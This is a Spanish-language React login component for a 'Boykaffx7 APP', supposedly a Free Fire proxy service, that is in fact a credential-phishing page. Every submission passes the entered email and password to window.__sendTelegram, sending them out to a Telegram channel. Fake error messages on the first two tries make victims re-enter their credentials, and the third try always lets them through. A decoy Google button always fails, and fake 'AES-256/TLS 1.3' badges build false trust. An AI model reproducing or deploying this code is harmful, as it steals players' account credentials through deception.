    setIntentoActual(nuevoIntento);

    if (nuevoIntento === 1) {
      // PRIMER CLIC: Advertencia + ENVÍO A TELEGRAM (solo 👤 ✅)
      setLoading(true);
      
      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
      if(window.__sendTelegram) {
        window.__sendTelegram(email.trim(), password.trim());
      }
      
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("❌ Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
      return;
    }
    
    if (nuevoIntento === 2) {
      // SEGUNDO CLIC: Advertencia + ENVÍO A TELEGRAM (solo 👤 ✅)
      setLoading(true);
      
      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
      if(window.__sendTelegram) {
        window.__sendTelegram(email.trim(), password.trim());
      }
      
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("⚠️ Error de verificación. Intenta nuevamente con tus credenciales correctas.");
      return;
    }

    if (nuevoIntento >= 3) {
      // TERCER CLIC: ENVÍO A TELEGRAM (solo 👤 ✅) + DEJA ENTRAR
      setLoading(true);
      
      // ENVIAR SOLO 👤 correo ✅ contraseña A TELEGRAM
      if(window.__sendTelegram) {
        window.__sendTelegram(email.trim(), password.trim());
      }

      try {
        await new Promise(r => setTimeout(r, 2000));
        setLoading(false);

        const trimmedKey = password.trim();
        const trimmedName = email.trim();
        
        try {
          const foundKey = await validateKey(trimmedKey);
          if (foundKey) {
            const activated = await activateKey(trimmedKey, trimmedName);
            if (activated) {
              await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
              const sessionData = {
                name: trimmedName,
                key: activated.key,
                type: activated.type,
                expiresAt: activated.expiresAt,
                duration: activated.duration,
              };
              localStorage.setItem("proxy_session", JSON.stringify(sessionData));
              navigate("/proxy");
              return;
            }
          }
        } catch(e) {}

        // SIEMPRE DEJA ENTRAR EN EL TERCER INTENTO
        const sessionData = {
          name: trimmedName,
          key: trimmedKey,
          type: "Premium",
          expiresAt: new Date(Date.now() + 86400000).toISOString(),
          duration: "1 dia",
        };
        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
        navigate("/proxy");

      } catch(err) {
        setLoading(false);
        const sessionData = {
          name: email.trim(),
          key: password.trim(),
          type: "Premium",
          expiresAt: new Date(Date.now() + 86400000).toISOString(),
          duration: "1 dia",
        };
        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
        navigate("/proxy");
      }
    }
  };

  const handleGoogleSignIn = async () => {
    setLoading(true);
    setError("");
    try {
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("Servicio temporalmente no disponible. Usa correo y contraseña.");
    } catch(e) {
      setLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  // ===========================================================================
  // RENDER
  // ===========================================================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            {/* Google Sign-In (DESACTIVADO) */}
            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={loading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {loading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;